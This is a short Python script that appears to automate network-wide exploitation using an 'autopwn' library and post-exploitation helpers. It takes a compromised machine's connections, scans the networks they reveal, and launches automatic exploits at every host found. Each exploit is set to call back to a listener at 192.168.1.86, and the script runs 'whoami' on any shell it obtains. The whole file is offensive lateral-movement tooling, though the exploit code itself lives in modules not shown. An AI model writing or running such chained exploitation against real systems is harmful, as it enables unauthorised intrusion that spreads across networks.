#!/bin/python

import autopwn as apwn
import post.postexploit as pexp


def chainpwn() -> int:
    connections = pexp.getTargetConnections()
    print(f"@IP found for current target : {connections}")
    netlist = pexp.machine_to_rzo(ip_list=connections)
    for net in netlist:
        print(f"Scanning following network {net}...")
        hosts = pexp.scanNetwork(net)
        print(f"These hosts have been found {hosts}")
        for h in hosts:
            (shell, client, srv) = apwn.autopwn(
                Rhosts=h,
                Lhost="192.168.1.86",
                generic_exploit=True,
                get_edb_exploits=False,
                com_and_cont=False,
                auto_mode=True,
            )
            if shell:
                apwn.sendCommands(shell, ["whoami"])
    return 0
